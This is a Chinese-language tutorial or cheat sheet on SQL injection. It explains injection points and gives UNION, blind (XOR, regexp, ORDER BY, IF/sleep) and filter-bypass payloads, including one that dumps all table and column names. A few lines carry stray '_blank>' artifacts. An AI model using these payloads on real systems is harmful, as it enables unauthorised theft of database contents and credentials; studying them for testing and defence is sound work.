# SQL注入

## SQL注入的原理

- 黑客以自己的意愿修改一条查询语句，以此来达到获取自己想要的信息的目的，通常都是利用网站对输入过滤不严格的漏洞来实现的。

- 简单例子：

    - `$query="select * from user where qq='$qq'"`;
    - 这是我们的查询语句，$qq是我们的变量，本来这里是提交QQ号的。比如QQ=123456
    - 查询语句为： `select * from user where qq=‘123456’`

    - 假如我们查询的qq为 `12345‘ union select * from admin --+`

    - 这时语句为 `select * from user where qq=‘12345‘ union select * from admin --+’`

    - 查询结果就会连 `admin` 的账号密码也输出出来。

## SQL注入的常用指令

- 数字型注入点

    - 许多网页链接有类似的结构 http://xxx.com/users.php?id=1 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。
    
    - 这一类的 SQL 语句原型大概为 select * from 表名 where id=1 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：
        
        `select * from 表名 where id=1 and 1=1`

- 字符型注入点

    - 网页链接有类似的结构 http://xxx.com/users.php?name=admin 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。
    
    - 这一类的 SQL 语句原型大概为 select * from 表名 where name='admin' 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

        `select * from 表名 where name='admin' and 1=1 ' `
        
    - 当然，在构造时要注意处理引号。

- 搜索型注入点

    - 这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 "keyword=关键字" 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like '%关键字%' 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

        `select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'`

- GET POST Cookie HTTP头部等报文注入

    - 这类注入都通过在报文中加入内容来实现注入，Burp Suite是个很好的工具。

- 联合查询注入

    - 可以使用union的情况下的注入。
 
    - 常用语句
        - 判断有无注入点 

            `; and 1=1 and 1=2`

        - 猜表一般的表的名称无非是admin adminuser user pass password 等.. 

            `and 0<>(select count(*) from *) `

            `and 0<>(select count(*) from admin)` ---判断是否存在admin这张表

        - 猜帐号数目 如果遇到0< 返回正确页面 1<返回错误页面说明帐号数目就是1个 

            `and 0<(select count(*) from admin)` 

            `and 1<(select count(*) from admin)`

        - 猜解字段名称 在len( ) 括号里面加上我们想到的字段名称. 

            `and 1=(select count(*) from admin where len(*)>0)-- `

            `and 1=(select count(*) from admin where len(用户字段名称name)>0) `

            `and 1=(select count(*) from admin where len(_blank>密码字段名称password)>0)`

        - 猜解各个字段的长度 猜解长度就是把>0变换 直到返回正确页面为止 

            `and 1=(select count(*) from admin where len(*)>0) `

            `and 1=(select count(*) from admin where len(name)>6)` 错误 

            `and 1=(select count(*) from admin where len(name)>5)` 正确 长度是6 

            `and 1=(select count(*) from admin where len(name)=6)` 正确

            `and 1=(select count(*) from admin where len(password)>11)` 正确 

            `and 1=(select count(*) from admin where len(password)>12)` 错误 长度是12 

            `and 1=(select count(*) from admin where len(password)=12)` 正确

        - 猜解字符 

            `and 1=(select count(*) from admin where left(name,1)=a)` ---猜解用户帐号的第一位 

            `and 1=(select count(*) from admin where left(name,2)=ab)`---猜解用户帐号的第二位 

            就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了 

            `and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51)`  这个查询语句可以猜解中文的用户和_blank>密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.



- 常用的盲注语句：

1. XOR注入:

    - payload：
        `admin'^(ascii(mid((password)from(i)))>j)^'1'='1'%23`
        或者
        `admin'^(ascii(mid((password)from(i)for(1)))>j)^'1'='1'%23`

        `mid()from()for()`：从XX除截取XX成员的部分内容，用`for()`限定截取长度

        最前面和最后面的语句都固定为真（逻辑结果都为1），只有中间的语句不确定真假
        那么整个payload的逻辑结果都由中间的语句决定，我们就可以用这个特性来判断盲注的结果了

        `0^1^0 --> 1` 语句返回为真
        `0^0^0 --> 0` 语句返回为假

    - 使用场景：
        过滤了关键字：and、or
        过滤了逗号，
        过滤了空格

        如果这里过滤了=号的话，还可以用>或者<代替(大小的比较)

        payload：
        `admin'^(ascii(mid((password)from(i)))>j)^('2'>'1')%23`
        如果这里过滤了%号和注释符的话，那就把最后一个引号去掉就可以和后面的引号匹配了 `'1'='1`

2. regexp注入:

    - payload:
        `select (select语句) regexp '正则'`

        与正常的查询语句的区别可以从以下例子中看出：
        `select user_pass from users where user_id = 1`
        `select (select user_pass from users where user_id = 1) regexp '^a'`

        每次判断一位或一个表达式匹配结果，匹配正确则返回1，错误则返回0

        或者regexp这个关键字还可以代替where条件里的=号：
        `select * from users where user_pass regexp '^a9'`

    - 使用场景：
        过滤了=、in、like
        这里的 `^` 如果也被过滤了的话，可以使用 `$` 来从后往前进行匹配：
        `select (select user_pass from users where user_id = 1) regexp 'a$'`

    - [更详细的参考资料](http://www.cnblogs.com/lcamry/articles/5717442.html)

3. order by盲注：
    - payload：
        `select * from users where user_id = '1' union select 1,2,'a',4,5,6,7 order by 3`

        `order by 'number' (asc/desc)`
        即对某一列进行排序，默认是升序排列，即后面默认跟上asc，那么上面一句就相当于

        `select * from users order by 3 asc`

        通常，如果某一项属性有如下两组键值对：`user_id=3` 和 `user_passwd=a1275` ，他们分别是第一列和第三列，
        则payload为：`select * from users where user_id = '3' union select $TEST order by 3` ，其中 `$TEST` 为自然数，一旦试出一个比 `user_passwd=a1275` 的首个值 `a` 更大的，则会自动由 user_id=3 的前面排到其后面，进而锁定 `user_id=3` 的成员对应密码的首个字母为 `a`

    - 使用场景：
        过滤了列名
        过滤了括号
        适用于已知该表的列名以及列名位置的注入

4. 杂项：
    1. 一些等效替代的函数(特殊符号)
        字符：

        空格 <--> `%20、%0a、%0b、/**/、 @tmp:=test`
        `and` <--> `or`
        `=` <--> `like` <--> `in` --> `regexp` <--> `rlike` --> `>` <--> `<`

        # @tmp:=test只能用在select关键字之后，等号后面的字符串随意

        函数：

        字符串截断函数：`left()`、`mid()`、`substr()`、`substring()`
        取ascii码函数：`ord()`、`ascii()`

    2. 一次性报所有表明和字段名
        
        ```sql
            (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x)
        ```

    3. `Subquery returns more than 1 row` 的解决方法：
            产生这个问题的原因是 **子查询多于一列** ，也就是 **显示为只有一列** 的情况下，没有使用 `limit` 语句限制，就会产生这个问题，即 `limt 0,1`

            如果我们这里的逗号被过滤了咋办？那就使用 `offset` 关键字：
            `limit 1 offset 1`

            如果我们这里的limit被过滤了咋办？那就试试下面的几种方法：

            - group_concat(使用的最多)
            - <>筛选(不等于)
            - not in
            - DISTINCT

    4. join注入
        payload：
        `1' union select * from (select 1) a join (select 2) b %23`

        优势：过滤了逗号的情况下使用

    5. 带!的注入

    6. if盲注(合理利用条件)
            if盲注的基本格式：

            if(条件,条件为真执行的语句,条件为假执行的语句)
            DVE ampache 的利用方式就是这种：
            admin' if(ascii(mid(user(),1,1))=100,sleep(5),1)